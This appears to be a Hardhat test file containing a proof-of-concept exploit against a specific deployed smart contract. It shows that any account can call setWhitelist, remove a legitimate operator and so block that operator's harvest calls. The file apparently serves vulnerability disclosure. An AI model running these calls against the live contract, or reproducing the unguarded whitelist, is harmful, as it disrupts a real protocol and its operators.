const { expect } = require("chai");
const { ethers } = require("hardhat");
const {expectRevert} = require("@openzeppelin/test-helpers");

describe("PoC demo", function () {
  this.timeout("250000");
  let target;
  before(async () => {
    target = await hre.ethers.getVerifiedContractAt("0x6B566554378477490ab040f6F757171c967D03ab");
  });
  it("Should be able to read the correct address", async function () {   console.log("the transmuter address at block 13267300 is: " + await 
      target.transmuter());
   });


   it("Check whitelist access control issue", async function () {
    let accounts = await ethers.getSigners();
    console.log("Am I whitelisted? : " + await target.whitelist(accounts[0].address));
    console.log(accounts[0].address);
    await target.setWhitelist([accounts[0].address],[true]);
    console.log("Am I whitelisted? : " + await target.whitelist(accounts[0].address));
  }); 

  it("Prevent legitimate harvest calls", async function () {
      const legitActor = "0x51e029a5ef288fb87c5e8dd46895c353ad9aaaec";
    //Remove the legitimate actor from the whitelist
    await target.setWhitelist([legitActor],[false]);
    //Impersonate the legitimate actor
    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [legitActor]}
    );
    const legitActorSigner = await ethers.provider.getSigner(legitActor);
    //Replay the tx as the legitimate actor with the same parameters
    //Note that we expect this to revert
    await expectRevert.unspecified(target.connect(legitActorSigner).harvest(0));
  });

});